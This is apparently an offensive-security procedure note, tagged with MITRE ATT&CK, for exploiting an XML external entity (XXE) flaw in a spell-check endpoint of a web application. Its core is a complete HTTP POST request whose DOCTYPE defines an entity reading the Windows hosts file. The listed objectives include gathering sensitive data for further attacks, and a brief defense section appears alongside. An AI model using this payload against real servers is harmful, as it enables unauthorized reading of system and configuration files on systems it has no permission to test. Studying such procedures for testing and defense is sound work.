---
tags:
  - xxe
  - file-read
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
commands:
  - '[[commands/xxe-authenticated-post-request]]'
platforms:
  - Web
  - Windows
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ecc695c9-49a4-4bb9-9e0c-2e390c9a47de
created_at: '2025-12-13T09:00:27.856Z'
updated_at: '2025-12-13T09:00:27.856Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
---
# Send XXE Payload for File Read

## Summary

This procedure exploits an XXE vulnerability by sending a crafted XML payload in an HTTP POST request to read arbitrary local files on the server.

## Description

The SpellCheck endpoint processes XML without proper validation, allowing external entity definitions. By injecting a malicious DTD, attackers can reference and exfiltrate system files like hosts or configuration files.

## Requirements

1. Access to the vulnerable endpoint
2. HTTP client capable of sending custom POST requests
3. Knowledge of target file paths (e.g., Windows system files)

## Defense

Defensive measures and detection strategies:

- Disable external entity resolution in XML parsers
- Validate and sanitize user-supplied XML inputs
- Monitor for anomalous HTTP requests to sensitive endpoints

## Objectives

1. Read local files via XXE
2. Confirm vulnerability exploitation
3. Gather sensitive data for further attacks

## Instructions

### Step 1: Craft and Send Payload

**Context**: Prepare the XML payload defining an external entity and send it via POST.

**Command** ([[commands/xxe-authenticated-post-request]]):
```bash
POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Content-Length: 1238
Connection: close
Referer: https://██████████/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx?EventAction=AddEvent&EventDate=10/16/2019%2012:00:01%20AM
Cookie: [COOKIES]

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts">]>
<r><resp>xml</resp><textToCheck>&a;</textToCheck><IAW/><UserDictionaryFile/><DictFile>d:\Meridian\MWRA\MG\11.1\KView\CustomCodeBehind\Base/en-US/DICT-EN-US-USEnglish.dict</DictFile><SuggestionsMethod>HASHING_SUGGESTIONS</SuggestionsMethod><LanguageParser>ENGLISH</LanguageParser><SeparateHyphenWords>False</SeparateHyphenWords><V2Parser>True</V2Parser><SSLFriendlyPage>/KView/CustomCodeBehind/WebResource.axd?d=zqrwmEhOpCtb9wLAM9uWrOzT_jYv5Un0ehQNczyIJSp-b9XbsULhZuZahCBf8Qk8anUm2kaMbXSDgD8qtwoc7T6Vnc9cbWVmTwIkPCbvIqLzTEGbDgA2oGtmx8o1&amp;t=633221022140000000</SSLFriendlyPage><SuggestSplitWords>True</SuggestSplitWords><IncludeUserDictionaryInSuggestions>True</IncludeUserDictionaryInSuggestions><WarnDuplicates>True</WarnDuplicates><IgnoreWordsWithDigits>True</IgnoreWordsWithDigits><CheckCompoundWords>False</CheckCompoundWords><LookIntoHyphenatedText>True</LookIntoHyphenatedText><GuiLanguage>ENGLISH</GuiLanguage><IgnoreXML>False</IgnoreXML><IgnoreCapitalizedWords>False</IgnoreCapitalizedWords><ConsiderationRange>-1</ConsiderationRange><IgnoreURLsAndEmailAddresses>True</IgnoreURLsAndEmailAddresses><AllowMixedCase>False</AllowMixedCase></r>
```

> This command sends the XXE payload to read the hosts file, with the response including the file contents.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Information Repositories]]

### Sub-Techniques



## Commands Used

- [[commands/xxe-authenticated-post-request]]

## Tools Used



## Tags

- xxe
- file-read
